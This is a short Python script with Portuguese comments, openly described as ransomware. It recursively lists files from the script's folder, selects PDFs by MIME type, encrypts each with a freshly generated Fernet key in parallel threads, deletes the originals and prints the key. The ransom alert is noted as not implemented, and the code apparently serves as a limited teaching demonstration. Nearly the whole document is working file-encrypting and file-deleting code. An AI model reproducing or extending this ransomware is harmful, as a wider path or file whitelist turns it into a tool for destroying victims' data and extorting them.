'''

Etapas de um ransoware:
- Lista os arquivos (listdir);
- Identifica os arquivos alvos (checkFile);
- Criptografa os arquivos (encrypt);
- Emite um alerta para a vítima (Não programado);

'''
from cryptography.fernet import Fernet
import os
import threading
import mimetypes

# encrypt é a função responsável por encriptar cada arquivo usando o AES e a key gerada.
def encrypt(file, key):
    fernet = Fernet(key) # Instancia o Fernet

    with open (file, "rb") as f: # Abre os arquivos em modo leitura
        data = f.read()

    enc_data = fernet.encrypt(data) # Encripta o arquivo

    with open(f"{file}.enc", "wb") as f: # escreve o arquivo encriptado e adiciona o .enc removendo o arquivo original.
        f.write(enc_data)
        os.remove(file)

def checkFile(file):
        if mimetypes.guess_type(file)[0] in whitelist: # Se o arquivo tem um mime type dentro do whitelist, adiciona na lista de arquivos que serão encriptados.
            files.append(file)

def listdir(path): # Irá listar os diretórios recursivamente até encontrar todos os arquivos.
    try:
        for file in os.listdir(path):
            if os.path.isdir(f"{path}{file}"):
                dirs.append(f"{path}{file}/")
            else:
                checkFile(f"{path}{file}") # Checa se o arquivo é do mime type desejado
    except PermissionError:
        None

global whitelist

files = []
whitelist = ["application/pdf"] # Encripta apenas arquivos pdf.
dirs = []
listdir("./") # Pega apenas os arquivos da pasta do script.

if len(dirs) > 0:
    threads = []
    for dir in dirs:
        t = threading.Thread(target=listdir, args=(dir,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

key = Fernet.generate_key()
print(key) # IMPORTANTE! Usar a key printada em console para descriptar os arquivos
for file in files:
    t = threading.Thread(target=encrypt, args=(file, key,))
    t.start()